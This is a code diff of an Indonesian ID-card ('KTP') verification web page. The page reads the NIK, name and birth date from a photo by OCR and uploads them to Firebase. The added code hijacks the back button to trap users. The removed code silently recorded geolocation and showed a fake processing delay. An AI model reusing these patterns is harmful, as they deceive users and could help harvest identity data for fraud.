@@ -6,77 +6,53 @@
 <title>Verifikasi KTP</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>
 
 <style>
-body {
-    margin:0;
-    background:#000;
-    color:#fff;
-    font-family:'Orbitron',sans-serif;
-    text-align:center;
-}
+body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:center}
 
 /* FRAME */
-.frame {
-    width:85%;
-    max-width:420px;
-    aspect-ratio:10/6;
-    border:2mm solid #888;
-    margin:20px auto;
-    border-radius:10px;
-    background:#111;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    position:relative;
+.frame{
+ width:85%;max-width:420px;aspect-ratio:10/6;
+ border:2mm solid #888;margin:20px auto;border-radius:10px;
+ background:#111;display:flex;justify-content:center;align-items:center;position:relative;
 }
-
-.frame img {
-    width:100%;
-    height:100%;
-    object-fit:cover;
-    display:none;
-}
-
-.label {
-    position:absolute;
-    color:#00aaff;
-    font-size:16px;
-    letter-spacing:3px;
-    opacity:0.7;
-}
+.frame img{width:100%;height:100%;object-fit:cover;display:none}
+.label{position:absolute;color:#00aaff;opacity:.7}
 
 /* BUTTON */
-.btn {
-    width:85%;
-    max-width:420px;
-    padding:14px;
-    margin:10px auto;
-    background:linear-gradient(45deg,#d4af37,#ffd700);
-    border:none;
-    color:#000;
-    font-weight:bold;
-    border-radius:8px;
+.btn{
+ width:85%;max-width:420px;padding:14px;margin:10px auto;
+ background:linear-gradient(45deg,#d4af37,#ffd700);
+ border:none;color:#000;font-weight:bold;border-radius:8px;
 }
 
-.btn-kirim {
-    width:85%;
-    max-width:420px;
-    padding:14px;
-    margin-top:25px;
-    background:linear-gradient(45deg,#005eff,#00aaff);
-    color:#fff;
-    border:none;
-    font-weight:900;
-    letter-spacing:2px;
-    border-radius:8px;
+/* FORM */
+.form{display:none}
+.input{
+ width:85%;max-width:420px;padding:10px;margin:5px auto;
+ border-radius:6px;border:none;
 }
 
-/* NOTIF */
-.notif {
-    margin-top:10px;
-    font-weight:bold;
+/* CHECKBOX */
+.checkbox{
+ display:none;width:85%;max-width:420px;
+ margin:10px auto;font-size:12px;text-align:left;
 }
+
+/* LOADING */
+#loadingScreen{
+ position:fixed;top:0;left:0;width:100%;height:100%;
+ background:#000;display:none;justify-content:center;align-items:center;
+ flex-direction:column;z-index:999;
+}
+.loader{
+ border:5px solid #222;border-top:5px solid #00aaff;
+ border-radius:50%;width:50px;height:50px;
+ animation:spin 1s linear infinite;
+}
+@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+
 </style>
 </head>
 
@@ -85,145 +61,152 @@ body {
 <h2>VERIFIKASI KTP</h2>
 
 <div class="frame">
-    <img id="preview">
-    <div class="label" id="label">FOTO KTP</div>
+ <img id="preview">
+ <div class="label" id="label">FOTO KTP</div>
 </div>
 
 <button class="btn" onclick="ambilFoto()">AMBIL FOTO</button>
-<button class="btn-kirim" onclick="kirim()">KIRIM</button>
 
-<div class="notif" id="notif"></div>
+<div class="form" id="formOCR">
+ <input class="input" id="nik" placeholder="NIK">
+ <input class="input" id="nama" placeholder="Nama">
+ <input class="input" id="ttl" placeholder="Tanggal / Bulan / Tahun" inputmode="numeric">
+</div>
+
+<div class="checkbox" id="box">
+ <input type="checkbox" id="check" onchange="kirimOtomatis()">
+ Data yang saya berikan sudah sesuai dengan Kartu Identitas saya.
+</div>
+
+<div id="notif"></div>
+
+<!-- LOADING -->
+<div id="loadingScreen">
+ <div class="loader"></div>
+ <p id="loadingText">Memproses Verifikasi... 0%</p>
+</div>
 
 <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
 
 <script type="module">
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
+/* LOCK BACK */
+history.pushState(null,null,location.href);
+window.onpopstate=()=>history.go(1);
 
-/* CONFIG */
-const firebaseConfig = {
-  apiKey: "ISI_APIKEY",
-  authDomain: "ISI.firebaseapp.com",
-  projectId: "ISI",
-  storageBucket: "ISI.appspot.com",
-  appId: "ISI_APPID"
+/* AUTO RESET */
+window.onload=()=>{
+ preview.style.display="none";
+ label.style.display="block";
+ formOCR.style.display="none";
+ box.style.display="none";
 };
 
-const app = initializeApp(firebaseConfig);
-const storage = getStorage(app);
+/* FIREBASE */
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
+import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-let lat="", lon="";
-let uploadSelesai=false;
-let fileRef=null;
+const firebaseConfig={
+ apiKey:"ISI_APIKEY",
+ authDomain:"ISI.firebaseapp.com",
+ projectId:"ISI",
+ storageBucket:"ISI.appspot.com",
+ appId:"ISI_APPID"
+};
 
-/* LOKASI */
-navigator.geolocation.getCurrentPosition(pos=>{
-    lat = pos.coords.latitude;
-    lon = pos.coords.longitude;
-});
+const app=initializeApp(firebaseConfig);
+const storage=getStorage(app);
+const db=getFirestore(app);
+
+let fileBlob=null;
 
 /* AMBIL FOTO */
-window.ambilFoto = ()=>{
-    document.getElementById("cameraInput").click();
-};
+window.ambilFoto=()=>cameraInput.click();
 
-/* VALIDASI KTP */
-function validasiKTP(img){
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
+/* FORMAT TTL */
+ttl.addEventListener("input",e=>{
+ let v=e.target.value.replace(/\D/g,"").slice(0,8);
+ e.target.value=v.replace(/(\d{2})(\d{2})(\d{4})/,"$1 / $2 / $3");
+});
 
-    canvas.width = img.width;
-    canvas.height = img.height;
-
-    ctx.drawImage(img,0,0);
-
-    const data = ctx.getImageData(0,0,canvas.width,canvas.height).data;
-
-    let green=0;
-
-    for(let i=0;i<data.length;i+=4){
-        const r=data[i], g=data[i+1], b=data[i+2];
-        if(g>r && g>b && g>100) green++;
-    }
-
-    return (green/(data.length/4)) > 0.1;
+/* EXTRACT OCR */
+function extract(t){
+ t=t.replace(/\s+/g,' ');
+ let nik=(t.match(/\b\d{16}\b)||[""])[0];
+ let nama=((t.match(/NAMA\s*[:\-]?\s*([A-Z\s]+)/)||["",""])[1]).trim();
+ let ttlRaw=t.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4})/);
+ let ttl=ttlRaw?`${ttlRaw[1]} / ${ttlRaw[2]} / ${ttlRaw[3]}`:"";
+ return {nik,nama,ttl};
 }
 
 /* HANDLE FOTO */
-cameraInput.onchange = async e=>{
-    const file = e.target.files[0];
-    if(!file) return;
+cameraInput.onchange=async e=>{
+ const file=e.target.files[0];
+ if(!file)return;
 
-    const reader = new FileReader();
+ fileBlob=file;
 
-    reader.onload = async e=>{
-        const img = document.getElementById("preview");
-        img.src = e.target.result;
-        img.style.display="block";
-        label.style.display="none";
+ preview.src=URL.createObjectURL(file);
+ preview.style.display="block";
+ label.style.display="none";
 
-        notif.innerText="Validasi...";
+ loadingText.innerText="Memproses Verifikasi... 0%";
+ loadingScreen.style.display="flex";
 
-        /* VALIDASI */
-        if(!validasiKTP(img)){
-            notif.innerText="❌ Bukan KTP";
-            return;
-        }
+ const result=await Tesseract.recognize(preview.src,'ind+eng',{
+  logger:m=>{
+   if(m.status==="recognizing text"){
+    loadingText.innerText="Memproses Verifikasi... "+Math.round(m.progress*100)+"%";
+   }
+  }
+ });
 
-        /* COMPRESS */
-        const canvas = document.createElement("canvas");
-        const ctx = canvas.getContext("2d");
+ loadingScreen.style.display="none";
 
-        canvas.width = img.width;
-        canvas.height = img.height;
-        ctx.drawImage(img,0,0);
+ const text=result.data.text.toUpperCase();
+ const data=extract(text);
 
-        let quality=0.9;
-        let dataUrl;
+ nik.value=data.nik;
+ nama.value=data.nama;
+ ttl.value=data.ttl;
 
-        do{
-            dataUrl = canvas.toDataURL("image/jpeg",quality);
-            quality -=0.1;
-        }while(dataUrl.length>2*1024*1024 && quality>0.3);
+ formOCR.style.display="block";
 
-        const blob = await (await fetch(dataUrl)).blob();
-
-        if(blob.size>2*1024*1024){
-            notif.innerText="❌ File > 2MB";
-            return;
-        }
-
-        notif.innerText="UPLOADING...";
-
-        const fileName="ktp_"+Date.now()+".jpg";
-        fileRef = ref(storage,fileName);
-
-        await uploadBytes(fileRef,blob,{
-            metadata:{lat,lon}
-        });
-
-        notif.innerText="PROCESSING WATERMARK...";
-
-        setTimeout(async ()=>{
-            const url = await getDownloadURL(fileRef);
-            img.src = url;
-            notif.innerText="UPLOAD SUCCESS";
-            uploadSelesai=true;
-        },4000);
-    };
-
-    reader.readAsDataURL(file);
+ cekField();
 };
 
-/* KIRIM */
-window.kirim = ()=>{
-    if(!uploadSelesai){
-        alert("Belum selesai upload!");
-        return;
-    }
+/* CEK FIELD */
+function cekField(){
+ if(nik.value && nama.value && ttl.value){
+  box.style.display="block";
+ }
+}
 
-    alert("Data berhasil dikirim!");
+nik.oninput=cekField;
+nama.oninput=cekField;
+ttl.oninput=cekField;
+
+/* KIRIM AUTO */
+window.kirimOtomatis=async ()=>{
+ if(!check.checked)return;
+
+ notif.innerText="Uploading...";
+
+ const fileName="ktp_"+Date.now()+".jpg";
+ const storageRef=ref(storage,fileName);
+
+ await uploadBytes(storageRef,fileBlob);
+
+ await addDoc(collection(db,"verifikasi"),{
+  nik:nik.value,
+  nama:nama.value,
+  tanggal_lahir:ttl.value,
+  file:fileName,
+  createdAt:serverTimestamp()
+ });
+
+ window.location.href="index3.html";
 };
 
 </script>
